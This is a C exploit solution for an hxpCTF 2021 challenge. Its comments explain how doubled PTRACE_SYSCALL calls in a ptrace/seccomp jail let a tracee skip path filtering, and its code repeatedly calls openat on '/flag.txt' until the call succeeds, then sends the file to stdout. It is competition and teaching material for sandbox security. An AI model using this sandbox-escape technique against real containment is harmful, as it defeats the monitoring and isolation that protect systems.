#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>

// Fix VSCode being annoying..
#ifndef AT_FDCWD
#define AT_FDCWD		-100
#endif /* AT_FDCWD */

// Definitions
#define STDOUT_FD (1)
#define MAX_FLAG_SIZE (256)

// Exploit for hxpCTF2021 / 日本旅行:
// (inspired by https://gist.github.com/pqlx/bfb932c96b5d8805a6f1781ae2865993 - Thx!)
// 
//  We need to somehow "escape" the seccomp/ptrace jail and read the flag file
//  under '/flag.txt'.
//  The main thing preventing us from straight up reading the file is the fact
//  that our "host" (tracer) waits on every syscall we make, and if it is one
//  of "open"/"openat" - it canonializes the path and sanitizes it.
// 
//  The vulnerability is in the path validation flow - when the tracer validates the
//  open/openat path, it accidentally calls "ptrace(PTRACE_SYSCALL, stop->pid, NULL, NULL);"
//  twice (once at 'handle_syscall()', and right afterwards at ST_SYSCALL flow at "guardian()").
//  Usually, the second call to ptrace fails with ESRCH and everything is fine.
//  But, if after the first PTRACE_SYSCALL call, our tracee calls another syscall,
//  we get a PTRACE_SYSCALL on syscall-entry - without filtering! (Practically - we de-sync
//  the 'proc->in_syscall' state).
//  This allows us to call 'openat("/flag.txt")' without path filtering, and thus
//  to read the flag!
//
int main(void)
{
    // Exploit host path filtering in order to open '/flag.txt' file
    int flag_fd = -1; 
    do {
        flag_fd = syscall(__NR_openat, AT_FDCWD, "/flag.txt", O_RDONLY);
    } while (flag_fd == -1);
    
    // Read out the flag to stdout
    syscall(__NR_sendfile, STDOUT_FD, flag_fd, NULL, MAX_FLAG_SIZE);  

    // Bye-bye!
    syscall(__NR_exit, 0);
}
